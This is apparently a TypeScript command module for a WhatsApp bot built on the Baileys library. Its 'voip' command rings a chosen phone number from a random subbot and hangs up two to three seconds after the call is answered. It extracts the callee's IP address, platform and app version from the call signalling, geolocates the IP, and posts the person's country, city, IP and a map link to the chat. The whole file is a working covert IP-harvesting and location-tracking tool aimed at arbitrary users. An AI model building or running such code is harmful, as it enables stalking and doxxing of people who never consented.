import { randomBytes } from "node:crypto";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const SWN = "@s.whatsapp.net";
const seen = new WeakSet<object>();
const log = (...a: any[]) => console.log("[voip]", ...a);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const P: Map<string, any> = ((globalThis as any).__voipP ??= new Map());
const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
const bare = (j: string) => `${digits(j)}${SWN}`;

function walk(n: any, o: any[] = []): any[] {
  if (!n) return o;
  o.push(n);
  if (Array.isArray(n.content)) for (const k of n.content) walk(k, o);
  return o;
}
function findNet(n: any): string | undefined {
  for (const x of walk(n)) {
    if (String(x?.tag || "").toLowerCase().includes("net")) {
      const a = x.attrs || {};
      const v = a.addr || a.ip || a.host;
      if (v && /\d+\.\d+\.\d+\.\d+/.test(String(v))) return String(v).split(":")[0];
    }
  }
  return undefined;
}
function attrsOf(n: any) {
  const o: Record<string, string> = {};
  for (const x of walk(n)) {
    const a = x.attrs || {};
    if (a.platform && !o.platform) o.platform = String(a.platform);
    if (a.version && !o.version) o.version = String(a.version);
  }
  return o;
}

async function geo(ip: string) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "voip" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

/* ───────────────────────── subbots ───────────────────────── */

const isSock = (v: any) => v && typeof v.sendMessage === "function" && v.ws && typeof v.query === "function";

function fromAny(x: any): any[] {
  if (!x) return [];
  if (isSock(x)) return [x];
  let arr: any[] = [];
  if (typeof x.values === "function") { try { arr = [...x.values()]; } catch {} }
  else if (Array.isArray(x)) arr = x;
  else if (typeof x === "object") arr = Object.values(x);
  return arr.map((v: any) => v?.sock ?? v?.client ?? v?.conn ?? v).filter(isSock);
}

function pool(ctx: any): { socks: any[]; where: string } {
  const G = globalThis as any;
  const found: any[] = [];
  let where = "ninguno";

  const named = [G.subbots, G.__subbots, G.subbotsMap, G.subbotManager, G.subbotsList, G.bots, G.connections, ctx.subbots, ctx.subbotManager];
  for (const c of named) {
    const got = fromAny(c);
    if (got.length) { found.push(...got); where = "directo"; break; }
  }

  if (!found.length) {
    for (const k of Object.keys(G)) {
      if (!/sub|bot|conn|sock|client|instance/i.test(k)) continue;
      if (k.startsWith("__voip")) continue;
      let v: any;
      try { v = G[k]; } catch { continue; }
      const got = fromAny(v);
      if (got.length) { found.push(...got); where = `global.${k}`; }
    }
  }

  const uniq = [...new Set(found)];
  return { socks: uniq, where };
}

function hook(sock: any) {
  if (seen.has(sock)) return;
  seen.add(sock);
  sock.ws.on("CB:call", (node: any) => {
    try {
      const first = Array.isArray(node?.content) ? node.content[0] : null;
      const tag = String(first?.tag || "").toLowerCase();
      const who = digits(String(node?.attrs?.from || first?.attrs?.["call-creator"] || ""));
      const p = P.get(who);
      log("CB:call", tag, who);
      if (!p || p.done) return;
      if (["offer", "preaccept", "accept", "transport"].includes(tag)) {
        const a = attrsOf(first);
        if (a.platform) p.platform = a.platform;
        if (a.version) p.version = a.version;
        const ip = findNet(first) || findNet(node);
        if (ip) p.ip = ip;
      }
      if (tag === "accept" && !p.done) {
        p.callId = String(first?.attrs?.["call-id"] || "") || p.callId;
        if (p.timer) clearTimeout(p.timer);
        p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
      }
    } catch (e) { log("hook err", e); }
  });
}

async function hangup(sock: any, target: string, callId?: string) {
  try {
    await sock.sendNode({
      tag: "call",
      attrs: { to: bare(target), id: sock.generateMessageTag?.() || `${Date.now()}` },
      content: [{ tag: "terminate", attrs: callId ? { "call-id": callId } : {} }],
    });
  } catch {}
}

/* ───────────────────────── oferta ───────────────────────── */

async function offer(sock: any, target: string, callId: string): Promise<string> {
  const B: any = await import("baileys");
  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidNormalizedUser, jidDecode } = B;

  const pn = bare(target);
  let lid: string | undefined;
  try { lid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(pn); } catch {}
  const peerLid = lid || pn;

  for (const j of [pn, peerLid]) { try { await sock.presenceSubscribe?.(j); } catch {} }
  await sleep(700);

  let devs: string[] = [];
  try {
    const list = await sock.getUSyncDevices([peerLid], true, false);
    devs = (list || []).map((d: any) => d.jid).filter(Boolean);
  } catch (e: any) { throw new Error(`getUSyncDevices: ${e?.message || e}`); }
  if (!devs.length) throw new Error("ese número no tiene dispositivos (¿no existe en WhatsApp?)");

  const norm = (j: string) => {
    const d = jidDecode?.(j);
    if (!d?.user) return j;
    const srv = j.endsWith("@lid") ? "lid" : "s.whatsapp.net";
    return d.device != null ? `${d.user}:${d.device}@${srv}` : `${d.user}@${srv}`;
  };

  const destinations = devs.map(norm).slice(0, 5);
  const primary = destinations[0];

  const targets = [...new Set(destinations.flatMap((j) => {
    const base = `${j.split("@")[0].split(":")[0]}@${j.split("@")[1]}`;
    return [base, j];
  }))];

  try {
    const keyNode = await sock.query({
      tag: "iq",
      attrs: { xmlns: "encrypt", type: "get", to: SWN },
      content: [{ tag: "key", attrs: {}, content: targets.map((j) => ({ tag: "user", attrs: { jid: j } })) }],
    });
    await B.parseAndInjectE2ESessions(keyNode, sock.signalRepository);
  } catch (e: any) { log("sesiones:", e?.message); }

  const callKey = randomBytes(32);
  let needIdentity = false;
  const destNodes: any[] = [];

  for (const j of destinations) {
    try {
      const { type, ciphertext } = await sock.signalRepository.encryptMessage({
        jid: j,
        data: encodeWAMessage({ call: { callKey: Buffer.from(callKey) } }),
      });
      if (type === "pkmsg") needIdentity = true;
      destNodes.push({ tag: "to", attrs: { jid: j }, content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }] });
    } catch (e: any) { log("cifrado:", j, e?.message); }
  }
  if (!destNodes.length) throw new Error("no se pudo cifrar para ningún dispositivo");

  const rootEnc = getBinaryNodeChild(destNodes[0], "enc");
  const meId = sock.authState?.creds?.me?.id || sock.user?.id;
  const dev = jidDecode?.(meId)?.device ?? 0;
  const creator = `${jidNormalizedUser(meId).split("@")[0].split(":")[0]}:${dev}@s.whatsapp.net`;

  const content: any[] = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "net", attrs: { medium: "2", protocol: "0" } },
    { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x11]) },
    { tag: "destination", attrs: {}, content: destNodes },
  ];
  if (rootEnc) content.push({ tag: "enc", attrs: { v: "2", type: rootEnc.attrs.type, count: String(destNodes.length) }, content: rootEnc.content });
  content.push({ tag: "encopt", attrs: { keygen: "2" } });
  if (needIdentity && sock.authState?.creds?.account) {
    try { content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }); } catch {}
  }

  const id = sock.generateMessageTag?.() || `${Date.now()}`;
  const ack: any = await sock.query({
    tag: "call",
    attrs: { to: primary, id },
    content: [{
      tag: "offer",
      attrs: {
        "call-creator": creator,
        "call-id": callId,
        e: "1",
        t: String(Math.floor(Date.now() / 1000)),
        platform: "web",
        version: "2.3000.1037863797",
      },
      content,
    }],
  });

  const err = ack?.attrs?.error;
  if (err && err !== "0") throw new Error(`el servidor rechazó la oferta (error ${err})`);
  return `${destinations.length} dispositivo(s)`;
}

/* ───────────────────────── cierre ───────────────────────── */

async function finish(p: any) {
  if (p.done) return;
  p.done = true;
  if (p.timer) clearTimeout(p.timer);
  P.delete(digits(p.target));
  await hangup(p.sock, p.target, p.callId);

  const g = await geo(p.ip || "");
  const num = digits(p.target);
  const lines = [
    `📞 *Llamada registrada*`,
    `Número: +${num}`,
    g ? `País: ${g.country || "?"}` : "",
    g ? `Ciudad: ${g.city || "?"}` : "",
    p.ip ? `IP: \`${p.ip}\`` : "IP: `relay`",
    `Plataforma: ${p.platform || "?"}`,
    p.version ? `Versión: ${p.version}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
  ].filter(Boolean);

  await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["voip", "llamar", "call"],
  category: "system",
  description: "Llama desde un subbot al azar, cuelga a los 2-3 s y devuelve IP, país, plataforma y versión.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const first = (args[0] || "").trim();

    const { socks: subs, where } = pool(ctx);
    const list = subs.length ? subs : [sock];

    if (/^(diag|test)$/i.test(first)) {
      const caps = ["offerCall", "sendNode", "query", "getUSyncDevices", "presenceSubscribe", "generateMessageTag"]
        .map((f) => `${typeof sock[f] === "function" ? "✅" : "❌"} ${f}`);
      caps.push(`${sock.signalRepository?.encryptMessage ? "✅" : "❌"} encryptMessage`);
      await reply(
        `Subbots: *${subs.length}*${subs.length ? ` (vía ${where})` : ""}\n\n${caps.join("\n")}`,
      ).catch(() => undefined);
      return;
    }

    /* une todos los args: "+57 320 3995335" -> 573203995335 */
    const joined = args.join("").replace(/\D/g, "");
    const quoted: string | undefined = info.participant;

    let target: string;
    if (joined.length >= 8) target = bare(joined);
    else if (quoted) target = bare(quoted);
    else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
    else {
      await reply("Uso: `.voip +573203995335` o responde a alguien.").catch(() => undefined);
      return;
    }

    const key = digits(target);
    if (P.has(key)) {
      await reply(`Ya hay llamada en curso a +${key}.`).catch(() => undefined);
      return;
    }

    const callSock = list[Math.floor(Math.random() * list.length)];
    hook(callSock);

    const p: any = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
    P.set(key, p);

    await react("📞").catch(() => undefined);
    const me = digits(callSock.authState?.creds?.me?.id || callSock.user?.id || "");
    await reply(`📞 Marcando +${key} desde \`${me}\`…`).catch(() => undefined);

    const callId = ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
    let how = "";
    try {
      how = await offer(callSock, target, callId);
    } catch (e: any) {
      P.delete(key);
      await react("❌").catch(() => undefined);
      await reply(`❌ ${fytBold("Falló")}: ${e?.message || e}`).catch(() => undefined);
      return;
    }

    p.timer = setTimeout(async () => {
      if (p.done) return;
      p.done = true;
      P.delete(key);
      await hangup(callSock, target, callId);
      await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
    }, 45000);

    await reply(`✅ Oferta enviada a ${how}. Esperando…`).catch(() => undefined);
  },
};
